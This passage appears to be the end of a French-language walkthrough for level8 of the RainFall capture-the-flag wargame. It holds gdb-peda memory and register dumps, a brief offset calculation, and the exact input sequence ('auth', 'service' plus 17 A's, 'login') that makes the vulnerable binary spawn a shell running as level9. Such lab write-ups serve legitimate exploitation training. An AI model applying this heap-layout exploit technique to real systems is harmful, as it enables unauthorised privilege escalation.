0008| 0xffffd138 --> 0xf7fae580 --> 0xfbad2288 
0012| 0xffffd13c --> 0xffffd1ac --> 0x8048761 (<__libc_csu_init+33>:    lea    eax,[ebx-0xe0])
0016| 0xffffd140 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
0020| 0xffffd144 --> 0x1 
0024| 0xffffd148 --> 0xf7fcb410 --> 0x8048315 ("GLIBC_2.0")
0028| 0xffffd14c --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080486e7 in main ()
gdb-peda$ p $eax
$1 = 0x804a9c0
gdb-peda$ i r
eax            0x804a9c0           0x804a9c0
ecx            0xffffd100          0xffffd100
edx            0xffffd100          0xffffd100
ebx            0x0                 0x0
esp            0xffffd130          0xffffd130
ebp            0xffffd1d8          0xffffd1d8
esi            0xffffd155          0xffffd155
edi            0x8048832           0x8048832
eip            0x80486e7           0x80486e7 <main+387>
eflags         0x246               [ PF ZF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gdb-peda$ x/s 0x804a9c0
0x804a9c0:      "\n"
gdb-peda$ x/s 0x804a9c0 + 0x20
0x804a9e0:      'A' <repeats 13 times>, "\n"
```
En ecrivant ```service + 29 * A```, lorsqu'on arrive a cette instruction : ```mov    eax,DWORD PTR [eax+0x20]``` on a 13 A qui sont présent.

Donc 17 * A  (29 - 13 + 1) sont suffisant:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ whoami  
level9
```

